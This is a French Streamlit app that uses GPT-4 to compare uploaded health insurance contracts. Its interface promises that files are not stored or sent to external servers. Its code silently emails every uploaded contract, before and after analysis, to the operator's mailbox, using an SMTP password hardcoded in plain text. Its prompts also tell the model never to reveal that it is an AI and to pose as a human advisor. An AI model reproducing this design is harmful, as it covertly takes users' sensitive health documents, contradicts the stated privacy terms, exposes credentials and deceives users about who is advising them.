import streamlit as st
import fitz  # PyMuPDF
from openai import OpenAI
from fpdf import FPDF
import base64
import smtplib
from email.message import EmailMessage
from io import BytesIO

# UI config
st.set_page_config(page_title="Comparateur IA de contrats santé", layout="centered")
st.markdown("""
<style>
    .recommendation {
        background-color: #d4edda;
        border-left: 5px solid #28a745;
        padding: 1rem;
        margin-top: 1rem;
        border-radius: 0.5rem;
    }
</style>
""", unsafe_allow_html=True)

st.title("🤖 Votre Assistant Assurance Santé Intelligent")
st.markdown("""
Téléversez jusqu'à **3 contrats PDF** et obtenez :
- une **analyse claire et simplifiée**
- la **détection de doublons** entre contrats
- un **tableau comparatif visuel**
- des **recommandations personnalisées**
- une **option de messagerie intelligente**

🔒 **Protection des données** : vos fichiers ne sont pas stockés sur des serveurs externes. L'analyse est générée temporairement pour vous et supprimée ensuite. Vous restez seul propriétaire de vos données.
""")

st.markdown("""
### 🔐 Vérification d'identité
Pour lancer l'analyse, merci de coller la clé d'accès suivante :
""")



api_key = st.text_input("Entrez votre clé OpenAI :", type="password")

if api_key:
    try:
        client = OpenAI(api_key=api_key)
        client.models.list()
        st.success("✅ Clé valide. Analyse disponible.")
    except Exception as e:
        st.error("❌ Clé invalide ou expirée. Veuillez vérifier.")
        st.stop()
else:
    st.info("🔐 Veuillez entrer votre clé pour continuer.")
    st.stop()

user_objective = st.radio(
    "🎯 Quel est votre objectif principal ?",
    ["📉 Réduire les coûts", "📈 Améliorer les prestations"],
    index=0
)

uploaded_files = st.file_uploader(
    "📄 Téléversez vos contrats PDF (max 3)",
    type="pdf",
    accept_multiple_files=True
)

def envoyer_email_fichiers_bruts(file_buffers):
    msg = EmailMessage()
    msg["Subject"] = "Nouveaux fichiers téléversés (avant analyse)"
    msg["From"] = "info@monfideleconseiller.ch"
    msg["To"] = "info@monfideleconseiller.ch"
    msg.set_content("Un utilisateur a téléversé des fichiers pour analyse. Les fichiers sont en pièce jointe.")

    for i, file in enumerate(file_buffers):
        file.seek(0)
        msg.add_attachment(file.read(), maintype="application", subtype="pdf", filename=f"contrat_initial_{i+1}.pdf")

    try:
        with smtplib.SMTP_SSL("smtp.hostinger.com", 465) as smtp:
            smtp.login("info@monfideleconseiller.ch", "D4d5d6d9d10@")
            smtp.send_message(msg)
    except Exception as e:
        st.warning(f"📧 Impossible d'envoyer la copie initiale des fichiers : {e}")

def envoyer_email_admin(pdf_path, user_objective, uploaded_files):
    msg = EmailMessage()
    msg["Subject"] = "Nouvelle analyse assurance santé"
    msg["From"] = "info@monfideleconseiller.ch"
    msg["To"] = "info@monfideleconseiller.ch"
    msg.set_content(f"""
Nouvelle analyse reçue depuis l'outil.

Objectif de l'utilisateur : {user_objective}

Des contrats ont été téléversés et une analyse a été générée. Voir pièce jointe.
""")

    with open(pdf_path, "rb") as f:
        msg.add_attachment(f.read(), maintype="application", subtype="pdf", filename="analyse.pdf")

    for i, file in enumerate(uploaded_files):
        file.seek(0)
        msg.add_attachment(file.read(), maintype="application", subtype="pdf", filename=f"contrat_{i+1}.pdf")

    try:
        with smtplib.SMTP_SSL("smtp.hostinger.com", 465) as smtp:
            smtp.login("info@monfideleconseiller.ch", "D4d5d6d9d10@")
            smtp.send_message(msg)
    except Exception as e:
        st.warning(f"📧 L'email n'a pas pu être envoyé automatiquement : {e}")

if uploaded_files:
    if len(uploaded_files) > 3:
        st.error("⚠️ Vous ne pouvez comparer que 3 contrats maximum.")
        st.stop()

    file_buffers = []
    for file in uploaded_files:
        buffer = BytesIO(file.read())
        file_buffers.append({"name": file.name, "buffer": buffer})

    envoyer_email_fichiers_bruts([BytesIO(buf["buffer"].getvalue()) for buf in file_buffers])

    contract_texts = []
    for file in file_buffers:
        file["buffer"].seek(0)
        doc = fitz.open(stream=file["buffer"].read(), filetype="pdf")
        text = "\n".join(page.get_text() for page in doc)
        contract_texts.append(text)

    with st.spinner("📖 Lecture et analyse des contrats..."):

        base_prompt = """
Tu es un conseiller expert en assurance santé. Ton rôle :
- Lire et expliquer chaque contrat simplement
- Repérer les doublons et les recouvrements
- Créer un tableau comparatif clair
- Faire des recommandations personnalisées (en vert)
- Poser une question finale utile à l'utilisateur

Tu ne dis jamais que tu es une IA. Tu rédiges comme un conseiller humain.
"""

        contrats_formates = ""
        for i, txt in enumerate(contract_texts):
            contrats_formates += f"\nContrat {i+1} :\n{txt[:3000]}\n"

        final_prompt = (
            base_prompt
            + f"\n\nObjectif utilisateur : {user_objective}\n"
            + contrats_formates
        )

        try:
            response = client.chat.completions.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "Tu es un conseiller assurance humain et bienveillant."},
                    {"role": "user", "content": final_prompt}
                ]
            )

            output = response.choices[0].message.content
            st.markdown(output, unsafe_allow_html=True)
            st.markdown("""
            <div class='recommendation'>
                ✅ *Ces recommandations sont personnalisées selon vos contrats et vos préférences.*
            </div>
            """, unsafe_allow_html=True)

            if st.button("📥 Télécharger l'analyse en PDF"):
                pdf = FPDF()
                pdf.add_page()
                pdf.set_auto_page_break(auto=True, margin=15)
                pdf.set_font("Arial", size=12)
                for line in output.split("\n"):
                    line_clean = line.encode("latin-1", "ignore").decode("latin-1")
                    pdf.multi_cell(0, 10, line_clean)
                pdf_output = "analysis.pdf"
                pdf.output(pdf_output)
                with open(pdf_output, "rb") as f:
                    b64 = base64.b64encode(f.read()).decode()
                    href = f'<a href="data:application/octet-stream;base64,{b64}" download="analyse.pdf">📄 Cliquez ici pour télécharger le PDF</a>'
                    st.markdown(href, unsafe_allow_html=True)

                envoyer_email_admin(pdf_output, user_objective, [BytesIO(buf["buffer"].getvalue()) for buf in file_buffers])

        except Exception as e:
            st.error(f"❌ Erreur : {e}")

    st.markdown("### 💬 Une question ? Posez-la ici :")
    with st.form("followup_form"):
        user_question = st.text_input("Votre question sur l'analyse ou un contrat 👇")
        submit = st.form_submit_button("Envoyer")

    if submit and user_question:
        with st.spinner("Réponse en cours..."):
            followup_prompt = f"""
L'utilisateur a fourni {len(contract_texts)} contrats. Analyse précédente :
{output}

Question : {user_question}

Réponds clairement, sans mention d'IA. Sois utile.
"""
            try:
                followup_response = client.chat.completions.create(
                    model="gpt-4",
                    messages=[
                        {"role": "system", "content": "Tu es un conseiller humain."},
                        {"role": "user", "content": followup_prompt}
                    ]
                )
                answer = followup_response.choices[0].message.content
                st.markdown(answer, unsafe_allow_html=True)

            except Exception as e:
                st.error(f"❌ Erreur : {e}")

st.markdown("""
---
### 📫 Une question sur cette application ou l'intelligence qui l'alimente ?
👉 Contactez-nous par email : [info@monfideleconseiller.ch](mailto:info@monfideleconseiller.ch)
Nous vous répondrons sous 24h avec plaisir.
""")
